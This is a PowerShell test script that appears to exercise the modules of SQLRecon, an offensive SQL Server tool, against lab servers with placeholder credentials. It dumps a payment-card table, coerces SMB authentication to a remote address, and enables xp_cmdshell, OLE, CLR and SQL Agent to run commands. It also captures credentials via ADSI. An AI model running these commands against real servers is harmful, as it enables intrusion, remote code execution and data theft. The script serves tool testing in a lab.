<#
    Execution instructions:
    powershell.exe -nop -exec bypass .\SQLRecon-Standard-Modules-Test.ps1
#>

<#
    The $global:* variables do not need to be changed.
    The only exception is $global:modules, which can be
    changed to match the number of test cases you execute.
#>
$global:timeout = 1
$global:count = 1
$global:modules = 29
$global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"

<#
    The $authentication variable acts as a quick way to
    switch the authentication type for the following commands.
#>
$authentication = "WinToken"
#$authentication = "WinDomain /domain:kawalabs /username:jsmith /password:Password123"
#$authentication = "WinDomain /domain:kawalabs /username:admin /password:Password123"
#$authentication = "Local /username:sa /password:Password123"
#$authentication = "AzureAD /domain:x.onmicrosoft.com /username:jsmith /password:Password123"
#$authentication = "AzureLocal /username:sa /password:Password123"

<#
    The following variables can be changed.
    - $sqlreconPath is the path to where SQLRecon is on disk.
    - $server1 is the hostname or IP of a SQL server.
    - $server2 is the hostname or IP of a SQL server, I use this for linked SQL servers.
    - $server3 is the hostname or IP of a SQL server, you might not need this.
    - $executionCommand is the command you want to execute via agentcmd, olecmd, or xpcmd.
    - $ouputPath is where you want to output the results of this script on disk in markdown.
      keep in mind that the path can not have special characters like ':'. '-' is fine.
#>
$sqlreconPath = ".\SQLRecon.exe"
$server1 = "SQL01"
$server2 = "SQL02"
$server3 = "SQL03"
$server4 = "sqlrecon.database.windows.net"
$executionCommand = "c:\temp\iexplore.exe"
$authenticationFormatted = $authentication.replace(' ','')
$ouputPath = $PSScriptRoot + "\sqlrecon-standard-$authenticationFormatted-$global:timestamp.md"

<#
    .Description
    The Execute function executes a supplied SQLRecon command.
#>
Function Execute($command)
{
    Write-Output "($global:count/$global:modules)"
    Write-Output $command
    Write-Output ""
    Write-Output "Output:"
    Write-Output '```'
    Invoke-Expression $command
    Write-Output '```'
    Write-Output ""
    Invoke-Expression "timeout /t $global:timeout" | Out-Null
    $global:count++
}

# Configuring output to file.
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path $ouputPath

Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Standard Modules Test Cases"
Write-Output "[+] Variables Set:"
Write-Output "  |-> SQLRecon Path: $sqlreconPath"
Write-Output "  |-> Ouput Path: $ouputPath"
Write-Output "  |-> Authentication: $authentication"
Write-Output "  |-> SQL Server 1: $server1"
Write-Output "  |-> SQL Server 2: $server2"
Write-Output "  |-> SQL Server 3: $server3" 
Write-Output "  |-> SQL Server 4: $server4" 
Write-Output "  |-> Execution Comand: $executionCommand"
Write-Output "[+] Starting test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Write-Output ""


# Add test cases in this area. In this case there are 29, which is why $global:modules is set to 29.
Execute "$sqlreconPath /help"
Execute "$sqlreconPath /enum:sqlspns"
Execute "$sqlreconPath /enum:sqlspns /domain:kawalabs.local"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:info"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:users"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /database:Payments /module:query /command:'select * from cc'"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:whoami"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:databases"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:tables /db:AdventureWorks"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /module:columns /db:Payments /table:cc"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:rows /db:AdventureWorks /table:SalesLT.Customer"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /database:Payments /module:search /keyword:card"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:smb /rhost:\\172.16.10.1\blah"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:links"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:impersonate"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:checkrpc"
Write-Output ""
Write-Output "[+] Executing Privileged Commands"
Write-Output ""
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:enablerpc /rhost:$server2"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:disablerpc /rhost:$server2"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:enablexp"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:xpcmd /command:$executionCommand"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:disablexp"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:enableole"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:olecmd /command:$executionCommand"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:disableole"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:enableclr"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:clr /dll:C:\Users\jsmith\Desktop\sql.dll /function:Chicken"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /module:disableclr"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /module:agentstatus"
Execute "$sqlreconPath /auth:$authentication /host:$server2 /module:agentcmd /command:$executionCommand"
Execute "$sqlreconPath /auth:$authentication /host:$server3 /module:adsi /rhost:linkADSI /lport:49100"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Standard Modules Test Cases"
Write-Output "[+] Completed test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Stop-Transcript